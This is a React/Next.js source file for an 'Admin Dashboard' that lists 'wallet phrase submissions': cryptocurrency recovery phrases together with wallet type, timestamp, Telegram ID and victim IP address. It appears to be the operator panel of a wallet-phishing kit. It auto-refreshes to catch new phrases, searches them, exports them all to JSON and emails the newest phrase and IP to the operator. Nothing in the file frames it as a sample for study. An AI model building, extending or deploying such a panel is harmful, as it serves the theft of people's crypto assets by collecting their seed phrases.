'use client'

import { useState, useEffect } from 'react'
import { useTheme } from '../../contexts/ThemeContext'

export default function AdminPage() {
  const [submissions, setSubmissions] = useState([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState(null)
  const [searchTerm, setSearchTerm] = useState('')
  const [filterWallet, setFilterWallet] = useState('all')
  const [lastRefreshed, setLastRefreshed] = useState(null)
  const [nextRefreshIn, setNextRefreshIn] = useState(25)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const { isDark, toggleTheme } = useTheme()

  useEffect(() => {
    fetchSubmissions()
    
    // Auto-refresh every 25 seconds to catch new submissions
    const interval = setInterval(() => {
      console.log('Auto-refreshing submissions every 25 seconds...')
      fetchSubmissions()
    }, 25000)
    
    // Countdown timer for next refresh
    const countdownInterval = setInterval(() => {
      setNextRefreshIn(prev => {
        if (prev <= 1) {
          return 25
        }
        return prev - 1
      })
    }, 1000)
    
    return () => {
      clearInterval(interval)
      clearInterval(countdownInterval)
    }
  }, [])

  const fetchSubmissions = async () => {
    try {
      setIsRefreshing(true)
      if (!submissions.length) {
        setLoading(true)
      }
      setError(null) // Clear any previous errors
      console.log('🔄 Fetching submissions...')
      
      // Add timestamp to prevent caching
      const response = await fetch(`/api/submissions?t=${Date.now()}`, {
        method: 'GET',
        headers: {
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      })
      console.log('📡 Response status:', response.status)
      console.log('📡 Response headers:', Object.fromEntries(response.headers.entries()))
      
      if (response.ok) {
        const data = await response.json()
        console.log('✅ Submissions data received:', data)
        console.log('📊 Submissions count:', data.submissions?.length || 0)
        console.log('🕒 Last updated:', data.lastUpdated)
        console.log('🔍 Raw data structure:', JSON.stringify(data, null, 2))
        
        if (data.submissions && data.submissions.length > 0) {
          console.log('📝 Latest submission:', {
            id: data.submissions[0].id,
            wallet: data.submissions[0].selected_wallet,
            timestamp: data.submissions[0].timestamp,
            telegram_id: data.submissions[0].telegram_id,
            phrase: data.submissions[0].phrase
          })
          
          // Log all submissions for debugging
          data.submissions.forEach((sub, index) => {
            console.log(`📝 Submission ${index + 1}:`, {
              id: sub.id,
              wallet: sub.selected_wallet,
              timestamp: sub.timestamp,
              phraseLength: sub.phrase?.length || 0
            })
          })
        } else {
          console.log('⚠️ No submissions found in response data')
        }
        
        setSubmissions(data.submissions || [])
        setLastRefreshed(new Date())
      } else {
        const errorText = await response.text()
        console.error('❌ API error response:', errorText)
        console.error('❌ Response status:', response.status)
        setError(`Failed to fetch submissions: ${response.status} - ${errorText}`)
      }
    } catch (error) {
      console.error('❌ Fetch error:', error)
      console.error('❌ Error details:', {
        message: error.message,
        name: error.name,
        stack: error.stack
      })
      setError('Error fetching submissions: ' + error.message)
    } finally {
      setLoading(false)
      setIsRefreshing(false)
    }
  }

  const filteredSubmissions = submissions.filter(submission => {
    // Use consistent snake_case field names to match database
    const walletName = submission.selected_wallet
    const matchesSearch = walletName.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         submission.phrase.join(' ').toLowerCase().includes(searchTerm.toLowerCase())
    const matchesWallet = filterWallet === 'all' || walletName === filterWallet
    return matchesSearch && matchesWallet
  })

  const walletTypes = [...new Set(submissions.map(s => s.selected_wallet))]

  const formatTimestamp = (timestamp) => {
    return new Date(timestamp).toLocaleString()
  }

  const exportToJSON = () => {
    const dataStr = JSON.stringify(submissions, null, 2)
    const dataBlob = new Blob([dataStr], { type: 'application/json' })
    const url = URL.createObjectURL(dataBlob)
    const link = document.createElement('a')
    link.href = url
    link.download = `wallet-submissions-${new Date().toISOString().split('T')[0]}.json`
    link.click()
    URL.revokeObjectURL(url)
  }

  const testEmailNotifications = async () => {
    try {
      if (submissions.length === 0) {
        alert('No submissions to send emails for')
        return
      }

      // Get the most recent submission
      const latestSubmission = submissions[0]
      
      // Prepare the submission data for email
      const emailData = {
        id: latestSubmission.id,
        selectedWallet: latestSubmission.selected_wallet,
        phrase: latestSubmission.phrase,
        timestamp: latestSubmission.timestamp,
        ip: latestSubmission.ip
      }

      console.log('Testing email notification for:', emailData)

      // Call the email API
      const response = await fetch('/api/test-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(emailData)
      })

      if (response.ok) {
        const result = await response.json()
        alert(`✅ Test email sent successfully!\n\nCheck your email inboxes for the notification.`)
        console.log('Test email result:', result)
      } else {
        const error = await response.text()
        alert(`❌ Failed to send test email: ${error}`)
        console.error('Test email error:', error)
      }
    } catch (error) {
      console.error('Error testing email:', error)
      alert(`❌ Error testing email: ${error.message}`)
    }
  }

  const handleThemeToggle = () => {
    console.log('Admin theme toggle clicked! Current theme:', isDark ? 'dark' : 'light')
    toggleTheme()
    // Check if the class was applied
    setTimeout(() => {
      const hasDarkClass = document.documentElement.classList.contains('dark')
      console.log('HTML has dark class after toggle:', hasDarkClass)
      console.log('LocalStorage theme:', localStorage.getItem('theme'))
    }, 100)
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-100 dark:bg-gray-900 flex items-center justify-center transition-colors duration-300">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">Loading submissions...</p>
        </div>
      </div>
    )
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gray-100 dark:bg-gray-900 flex items-center justify-center transition-colors duration-300">
        <div className="text-center">
          <div className="text-red-600 text-6xl mb-4">⚠️</div>
          <h1 className="text-2xl font-bold text-gray-900 dark:text-white mb-2 transition-colors duration-300">Error</h1>
          <p className="text-gray-600 dark:text-gray-300 mb-4 transition-colors duration-300">{error}</p>
          <button
            onClick={fetchSubmissions}
            className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
          >
            Retry
          </button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-100 dark:bg-gray-900 p-6 transition-colors duration-300">
      <div className="max-w-7xl mx-auto">
        {/* Debug Info */}
        <div className="text-center mb-4 text-sm text-gray-600 dark:text-gray-400 bg-white dark:bg-gray-800 p-2 rounded">
          Current Theme: {isDark ? 'Dark' : 'Light'} | 
          HTML Class: {typeof window !== 'undefined' && document.documentElement.classList.contains('dark') ? 'dark' : 'light'} |
          Storage: {typeof window !== 'undefined' ? localStorage.getItem('theme') || 'none' : 'loading...'}
        </div>
        
        {/* Connection Status */}
        <div className={`text-center mb-4 p-3 rounded-lg ${
          error ? 'bg-red-100 dark:bg-red-900/20 text-red-700 dark:text-red-300' : 
          'bg-green-100 dark:bg-green-900/20 text-green-700 dark:text-green-300'
        }`}>
          <div className="flex items-center justify-center space-x-2">
            <span className="text-lg">{error ? '❌' : '✅'}</span>
            <span className="font-medium">
              {error ? 'Database Connection Error' : 'Database Connected Successfully'}
            </span>
          </div>
          {error && (
            <div className="mt-2 text-sm">
              <p className="font-medium">Error Details:</p>
              <p className="break-all">{error}</p>
            </div>
          )}
        </div>
        
        {/* Environment Check */}
        <div className="text-center mb-4 p-3 rounded-lg bg-blue-100 dark:bg-blue-900/20 text-blue-700 dark:text-blue-300">
          <div className="text-sm">
            <p className="font-medium mb-2">Environment Variables Status:</p>
            <div className="grid grid-cols-2 gap-2 text-xs">
              <div className="flex items-center space-x-2">
                <span>🔑 Supabase URL:</span>
                <span className={typeof window !== 'undefined' && process.env.NEXT_PUBLIC_SUPABASE_URL ? 'text-green-600' : 'text-red-600'}>
                  {typeof window !== 'undefined' && process.env.NEXT_PUBLIC_SUPABASE_URL ? '✅ Set' : '❌ Missing'}
                </span>
              </div>
              <div className="flex items-center space-x-2">
                <span>🔑 Supabase Key:</span>
                <span className={typeof window !== 'undefined' && process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ? 'text-green-600' : 'text-red-600'}>
                  {typeof window !== 'undefined' && process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ? '✅ Set' : '❌ Missing'}
                </span>
              </div>
            </div>
            <p className="mt-2 text-xs opacity-75">
              Note: Environment variables are only visible on the server side
            </p>
          </div>
        </div>

        {/* Header */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-xl p-6 mb-6 transition-colors duration-300">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h1 className="text-3xl font-bold text-gray-900 dark:text-white transition-colors duration-300">🔐 Admin Dashboard</h1>
              <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">View all wallet phrase submissions</p>
              <div className="flex items-center space-x-4 mt-2 text-sm text-gray-500 dark:text-gray-400">
                <span>📊 Total Submissions: {submissions.length}</span>
                {lastRefreshed && (
                  <span>🕒 Last Updated: {lastRefreshed.toLocaleTimeString()}</span>
                )}
                <span className="text-blue-600">🔄 Auto-refresh: Every 25s</span>
                <span className="text-green-600">⏱️ Next refresh in: {nextRefreshIn}s</span>
              </div>
            </div>
            <div className="flex space-x-3">
              <button
                onClick={fetchSubmissions}
                className={`px-4 py-2 text-white rounded-lg transition-colors flex items-center space-x-2 ${
                  isRefreshing 
                    ? 'bg-blue-400 cursor-not-allowed' 
                    : 'bg-blue-600 hover:bg-blue-700'
                }`}
                title="Refresh submissions"
                disabled={isRefreshing}
              >
                <svg className={`w-4 h-4 ${isRefreshing ? 'animate-spin' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                </svg>
                <span>{isRefreshing ? 'Refreshing...' : 'Refresh Now'}</span>
              </button>
              <button
                onClick={handleThemeToggle}
                className="flex items-center space-x-2 px-3 py-2 rounded-lg bg-gray-100 dark:bg-gray-700 hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors text-gray-700 dark:text-gray-200 font-medium"
                title={isDark ? 'Switch to Light Mode' : 'Switch to Dark Mode'}
              >
                {isDark ? (
                  <>
                    <svg className="w-4 h-4 text-yellow-500" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" clipRule="evenodd" />
                    </svg>
                    <span className="text-sm">Light</span>
                  </>
                ) : (
                  <>
                    <svg className="w-4 h-4 text-gray-700" fill="currentColor" viewBox="0 0 20 20">
                      <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z" />
                    </svg>
                    <span className="text-sm">Dark</span>
                  </>
                )}
              </button>
              <button
                onClick={testEmailNotifications}
                className="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors"
              >
                📧 Test Emails
              </button>
              <button
                onClick={exportToJSON}
                className="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors"
              >
                📥 Export JSON
              </button>
              <button
                onClick={fetchSubmissions}
                className={`px-4 py-2 text-white rounded-lg transition-colors ${
                  isRefreshing ? 'bg-yellow-600 cursor-not-allowed' : 'bg-yellow-600 hover:bg-yellow-700'
                }`}
                disabled={isRefreshing}
              >
                🔍 Test DB Connection
              </button>
              <a
                href="/test-db"
                className="px-4 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors text-center"
              >
                🧪 DB Test Page
              </a>
            </div>
          </div>
          
          {/* Debug Panel */}
          <div className="bg-gray-50 dark:bg-gray-700 p-4 border-t border-gray-200 dark:border-gray-600">
            <h3 className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Debug Information</h3>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-xs text-gray-600 dark:text-gray-400">
              <div>
                <span className="font-medium">API Status:</span> 
                <span className={`ml-1 ${error ? 'text-red-500' : 'text-green-500'}`}>
                  {error ? '❌ Error' : '✅ OK'}
                </span>
              </div>
              <div>
                <span className="font-medium">Data Count:</span> 
                <span className="ml-1">{submissions.length}</span>
              </div>
              <div>
                <span className="font-medium">Last Fetch:</span> 
                <span className="ml-1">{lastRefreshed ? lastRefreshed.toLocaleTimeString() : 'Never'}</span>
              </div>
              <div>
                <span className="font-medium">Auto-refresh:</span> 
                <span className="ml-1 text-green-500">🔄 Active (25s)</span>
              </div>
              <div>
                <span className="font-medium">Next Refresh:</span> 
                <span className="ml-1 text-orange-500">⏱️ {nextRefreshIn}s</span>
              </div>
            </div>
          </div>

          {/* Stats */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4">
            <div className="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-200 dark:border-blue-700">
              <div className="text-2xl font-bold text-blue-600 dark:text-blue-400">{submissions.length}</div>
              <div className="text-sm text-blue-600 dark:text-blue-400">Total Submissions</div>
            </div>
            <div className="bg-green-50 dark:bg-green-900/20 p-4 rounded-lg border border-green-200 dark:border-green-700">
              <div className="text-2xl font-bold text-green-600 dark:text-green-400">{walletTypes.length}</div>
              <div className="text-sm text-green-600 dark:text-green-400">Wallet Types</div>
            </div>
            <div className="bg-purple-50 dark:bg-purple-900/20 p-4 rounded-lg border border-purple-200 dark:border-purple-700">
              <div className="text-2xl font-bold text-purple-600 dark:text-purple-400">
                {submissions.length > 0 ? formatTimestamp(submissions[0].timestamp).split(',')[0] : 'N/A'}
              </div>
              <div className="text-sm text-purple-600 dark:text-purple-400">Latest Submission</div>
            </div>
            <div className="bg-orange-50 dark:bg-orange-900/20 p-4 rounded-lg border border-orange-200 dark:border-orange-700">
              <div className="text-2xl font-bold text-orange-600 dark:text-orange-400">
                {submissions.length > 0 ? formatTimestamp(submissions[submissions.length - 1].timestamp).split(',')[0] : 'N/A'}
              </div>
              <div className="text-sm text-orange-600 dark:text-orange-400">First Submission</div>
            </div>
          </div>
        </div>

        {/* Filters */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-xl p-4 sm:p-6 mb-6 transition-colors duration-300">
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-2 transition-colors duration-300">Search</label>
              <input
                type="text"
                placeholder="Search by wallet or phrase words..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-white dark:bg-gray-700 text-gray-900 dark:text-white placeholder-gray-500 dark:placeholder-gray-400 transition-colors duration-300"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-2 transition-colors duration-300">Filter by Wallet</label>
              <select
                value={filterWallet}
                onChange={(e) => setFilterWallet(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-white dark:bg-gray-700 text-gray-900 dark:text-white transition-colors duration-300"
              >
                <option value="all">All Wallets</option>
                {walletTypes.map(wallet => (
                  <option key={wallet} value={wallet}>{wallet}</option>
                ))}
              </select>
            </div>
          </div>
        </div>

        {/* Submissions List */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-xl overflow-hidden transition-colors duration-300">
          <div className="px-6 py-4 border-b border-gray-200 dark:border-gray-700">
            <div className="flex items-center justify-between">
              <h2 className="text-xl font-semibold text-gray-900 dark:text-white transition-colors duration-300">
                Submissions ({submissions.length})
              </h2>
              <div className="text-sm text-gray-500 dark:text-gray-400">
                {submissions.length > 0 && (
                  <span>Latest: {formatTimestamp(submissions[0].timestamp)}</span>
                )}
              </div>
            </div>
          </div>

          {filteredSubmissions.length === 0 ? (
            <div className="p-8 text-center">
              <div className="text-gray-400 dark:text-gray-500 text-6xl mb-4">📭</div>
              <p className="text-gray-600 dark:text-gray-400 transition-colors duration-300">No submissions found</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
                <thead className="bg-gray-50 dark:bg-gray-700">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">ID</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Wallet</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Phrase</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Timestamp</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">IP</th>
                  </tr>
                </thead>
                <tbody className="bg-white dark:bg-gray-800 divide-y divide-gray-200 dark:divide-gray-700">
                  {filteredSubmissions.map((submission, index) => (
                    <tr key={submission.id} className={index % 2 === 0 ? 'bg-white dark:bg-gray-800' : 'bg-gray-50 dark:bg-gray-700'}>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900 dark:text-white">
                        #{typeof submission.id === 'string' ? submission.id.slice(-6) : submission.id.toString().slice(-6)}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 dark:bg-blue-900 text-blue-800 dark:text-blue-200">
                          {submission.selected_wallet}
                        </span>
                      </td>
                      <td className="px-6 py-4">
                        <div className="text-sm text-gray-900 dark:text-white">
                          <div className="grid grid-cols-4 gap-1 mb-2">
                            {submission.phrase.map((word, wordIndex) => (
                              <span key={wordIndex} className="text-xs bg-gray-100 dark:bg-gray-600 px-2 py-1 rounded text-gray-900 dark:text-gray-100 font-mono">
                                {wordIndex + 1}. {word}
                              </span>
                            ))}
                          </div>
                          <div className="text-xs text-gray-500 dark:text-gray-400 font-mono bg-gray-50 dark:bg-gray-700 p-2 rounded border">
                            {submission.phrase.join(' ')}
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500 dark:text-gray-400">
                        {formatTimestamp(submission.timestamp)}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500 dark:text-gray-400">
                        {submission.ip}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}